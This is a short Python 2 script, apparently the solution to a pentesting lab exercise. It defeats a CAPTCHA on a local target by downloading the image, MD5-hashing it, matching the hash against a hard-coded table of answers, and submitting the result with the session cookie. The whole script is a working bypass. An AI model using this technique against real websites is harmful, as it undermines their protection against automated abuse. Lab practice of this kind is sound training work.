import cookielib, urllib2, urllib
from lxml import etree
import requests

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
page = opener.open("http://192.168.60.134/captcha/example5/")
page.addheaders = [('User-agent', 'Mozilla/5.0')]
reddit = etree.HTML(page.read())

for img in reddit.xpath('//img/@src'):
    print img
a = str(img)
resource = urllib.urlopen('http://192.168.60.134/captcha/example5/' + a)
output = open("file01.png","wb")
output.write(resource.read())
output.close()

#md5 hash th image file 

import hashlib
 
hasher = hashlib.md5()
with open('file01.png', 'rb') as afile:
    buf = afile.read()
    hasher.update(buf)
md5 = (hasher.hexdigest())
md5= str(md5) 
print md5

string = ""
#check if the md5 is = to the list already created.

if md5 == "FE9AC5CFB7B2438C900ED3E56C0E2CB0" : string = "0dayz"
elif md5 == "4c298cfa40e502fb644d9a5fdc9c6a11": string ="vulnerability"
elif md5 == "3761dd5bdb3dae4fc7ba3d5652b7bfc0": string = "security"
elif md5 == "4039a3ef7fc79e4adb60b43ac108d648": string = "admin"
elif md5== "93c985c35fa28eb819d91b5f55be7b65": string = "compromise"
elif md5== "3d0a2ab11fb9c59d19a9d95d56ea2e6d": string = "hacker"
elif md5 == "539746c4b3beae3e77773fa940d83d78": string = "petester"
elif md5 == "fe9ac5cfb7b2438c900ed3e56c0e2cb0" :string = "0dayz"
else: 	print "end"

print ""+string

url = "http://192.168.60.134/captcha/example5/submit?captcha="+string+"&submit=Submit+Query" #Answer that the webpage sends to the server to validate.
r = requests.get(url, cookies=cj) # send the request with the cookie set to the server
print r
